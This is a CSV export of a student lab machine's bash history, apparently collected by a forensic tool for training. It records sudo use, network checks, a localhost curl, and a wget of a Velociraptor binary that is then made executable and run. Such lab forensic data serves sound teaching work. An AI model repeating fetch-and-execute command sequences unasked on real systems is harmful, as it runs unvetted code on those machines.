OSPath,Mtime,Username,CommandLine,DownloadCommand
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,sudo su,sudo su
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,vi test.txt,vi test.txt
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,wget https://github.com/Velocidex/velociraptor/releases/download/v0.74/velociraptor-v0.74.1-linux-amd64,wget https://github.com/Velocidex/velociraptor/releases/download/v0.74/velociraptor-v0.74.1-linux-amd64
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,chmod +x velociraptor-v0.74.1-linux-amd64 ,chmod +x velociraptor-v0.74.1-linux-amd64 
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,./velociraptor-v0.74.1-linux-amd64 comfig client generate -i,./velociraptor-v0.74.1-linux-amd64 comfig client generate -i
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,./velociraptor-v0.74.1-linux-amd64 config client generate -i,./velociraptor-v0.74.1-linux-amd64 config client generate -i
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,./velociraptor-v0.74.1-linux-amd64 config client,./velociraptor-v0.74.1-linux-amd64 config client
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ifconfig,ifconfig
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ip -a,ip -a
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ip a,ip a
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ping 10.9.8.169,ping 10.9.8.169
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,sudo su,sudo su
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,exit,exit
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls /Down,ls /Down
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls Download,ls Download
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,cd Downloads,cd Downloads
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,curl,curl
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,curl http://localhost:8080/?name=world,curl http://localhost:8080/?name=world
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,exit,exit
/home/student/.bash_history,2025-04-22T21:24:23-04:00,,chmod +x open_termial.sh ,chmod +x open_termial.sh 
